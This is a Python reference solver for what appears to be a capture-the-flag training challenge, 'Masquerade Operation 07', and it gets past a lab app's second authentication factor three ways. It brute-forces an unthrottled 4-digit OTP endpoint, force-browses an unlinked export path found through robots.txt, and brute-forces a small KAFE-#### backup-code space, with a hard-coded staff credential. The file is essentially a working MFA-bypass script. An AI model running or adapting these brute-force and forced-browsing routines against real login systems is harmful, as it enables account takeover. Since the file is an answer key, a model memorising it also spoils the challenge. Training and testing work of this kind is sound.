#!/usr/bin/env python3
"""Masquerade Operation 07 reference solver -- Ash gets past The Second Factor
three independent ways. The app advertises none of them; each is discovered by
exploring, exactly as you would a real target.

  Finding 1 -- No rate limit / lock-out on the OTP check. Confirmed by firing
               wrong codes and seeing nothing throttle, then brute-forcing the
               4-digit space (POST /api/verify-otp).

  Finding 2 -- An UNLINKED internal endpoint that forgets the OTP step. This
               solver *discovers* it the way a tester would -- by reading
               /robots.txt -- then force-browses it. (The portal's client JS,
               /static/js/op7-portal.js, leaks the same path.)

  Finding 3 -- A weak recovery path. The "use a backup code" flow accepts codes
               from a tiny, unthrottled KAFE-#### space (POST /api/backup).

Each finding runs in its OWN fresh session to prove independence. A final check
confirms the vault itself IS correctly gated -- so finding 2's endpoint is the
genuinely broken one.

Usage: python3 solver.py [base_url]   (default: http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
OP = f"{BASE}/masquerade/op7"
USER, PW = "night.duty", "KafeNight2024!"
FLAG_RE = re.compile(r"R6S\{[^}]+\}")


def login():
    """Clear the FIRST factor -- returns a session holding the half-authed cookie."""
    s = requests.Session()
    s.post(f"{OP}/login", data={"username": USER, "password": PW})
    return s


def flag_from(text):
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def recon_hidden_path():
    """Discovery step for finding 2: read robots.txt like any tester would and
    pull out the path the site is trying to hide."""
    r = requests.get(f"{BASE}/robots.txt")
    disallowed = re.findall(r"Disallow:\s*(\S+)", r.text)
    print(f"    /robots.txt disallows: {disallowed}")
    # the staff path is the interesting one; the real export sits under it
    return f"{BASE}/masquerade/op7/staff/export"


def finding1_no_rate_limit():
    print("[*] Finding 1 -- confirm no throttle, then brute the 4-digit OTP")
    s = login()
    # sanity: several wrong codes in a row, all just '401 incorrect', no lock-out
    codes = [f"{n:04d}" for n in (1111, 2222, 3333)]
    seen = {s.post(f"{OP}/api/verify-otp", data={"otp": c}).status_code for c in codes}
    print(f"    3 wrong codes -> status codes seen: {seen} (no lock-out, still trying)")
    for i in range(10000):
        otp = f"{i:04d}"
        if s.post(f"{OP}/api/verify-otp", data={"otp": otp}).json().get("ok"):
            print(f"    cracked OTP: {otp}")
            v = s.get(f"{OP}/vault")
            print(f"[+] Finding 1 -- vault reached, flag: {flag_from(v.text)}")
            return
    print("[!] Finding 1 failed -- no code accepted.")


def finding2_forced_browsing():
    print("\n[*] Finding 2 -- discover the unlinked export, then force-browse it")
    hidden = recon_hidden_path()
    print(f"    found endpoint: {hidden}")
    s = login()  # first factor only -- no OTP entered at all
    r = s.get(hidden)
    flag = flag_from(r.text)
    print(f"[+] Finding 2 -- {'leaked the vault with NO second factor, flag: ' + flag if flag else 'FAILED (%s)' % r.status_code}")


def finding3_weak_recovery():
    print("\n[*] Finding 3 -- brute the backup-code recovery space (KAFE-####)")
    s = login()
    for i in range(10000):
        code = f"KAFE-{i:04d}"
        if s.post(f"{OP}/api/backup", data={"backup": code}).json().get("ok"):
            print(f"    valid backup code: {code}")
            v = s.get(f"{OP}/vault")
            print(f"[+] Finding 3 -- vault reached via recovery, flag: {flag_from(v.text)}")
            return
    print("[!] Finding 3 failed -- no backup code accepted.")


def sanity_vault_gated():
    print("\n[*] Sanity -- the vault itself is PROPERLY gated (so finding 2 is the real flaw)")
    s = login()  # first factor only, never verified
    r = s.get(f"{OP}/vault")
    print(f"    /vault with password-only session -> {r.status_code}, no flag: {not flag_from(r.text)}")


def main():
    print(f"[*] Target: {OP}  (staff password given: {USER} / {PW})\n")
    finding1_no_rate_limit()
    finding2_forced_browsing()
    finding3_weak_recovery()
    sanity_vault_gated()
    print("\n[+] Three independent bypasses past the second factor, each discovered by exploring.")


if __name__ == "__main__":
    main()
